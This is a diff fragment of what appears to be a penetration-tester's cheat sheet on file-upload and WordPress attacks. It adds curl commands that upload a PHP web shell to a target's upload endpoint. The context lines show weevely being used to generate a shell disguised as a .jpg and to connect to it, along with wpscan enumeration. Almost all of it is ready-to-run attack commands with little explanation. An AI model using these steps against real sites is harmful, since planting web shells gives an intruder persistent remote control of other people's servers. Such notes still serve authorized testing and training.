@@ -86,10 +86,12 @@ echo "<pre>$output</pre>";
 - __you can use weevely to generate php script in the formate of .jpg__
 - __```weevely generate password ~/Desktop/shell.jpg```__
 - __```weevely <url_where_the_file_uploaded>/shell.jpg/shell.php password```__
+- __`curl -F "Filedata=@./shell.php" <url_of_upload>`__
 
 ## WordPress
 - __```wpscan --url <url>```__
 - __`<url>/wp-content/uploads`__
+- __`curl -F "Filedata=@./shell.php" <url_of_upload>`__
 
 # Check list
 - [x] [Open redirect](open_redirect.md)
